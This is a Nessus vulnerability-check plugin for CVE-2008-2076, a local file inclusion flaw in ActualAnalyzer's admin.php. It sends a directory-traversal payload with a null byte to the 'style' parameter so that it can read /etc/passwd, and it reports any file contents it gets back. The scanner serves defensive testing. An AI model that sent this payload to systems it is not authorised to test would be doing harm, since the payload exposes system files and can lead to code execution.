#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32122);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-2076");
  script_bugtraq_id(29007);
  script_xref(name:"milw0rm", value:"5528");
  script_xref(name:"OSVDB", value:"44823");
  script_xref(name:"Secunia", value:"30052");

  script_name(english:"ActualAnalyzer Lite style Variable Traversal Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ActualAnalyzer, a PHP-based tool for
monitoring web site traffic. 

The version of ActualAnalyzer installed on the remote host fails to
sanitize user-supplied input to the 'style' parameter of the
'admin.php' script before using it to include PHP code.  Regardless of
PHP's 'register_globals' setting, an unauthenticated attacker may be
able to leverage this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/actualanalyzer", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "../../../../../../../../../../../../etc/passwd";

  r = http_send_recv3(method:"GET", port:port,
    item:string( dir, "/admin.php?",  "style=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    string("top(./style/", file, "\\0") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("top(./style/", file) >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the (repeated) contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
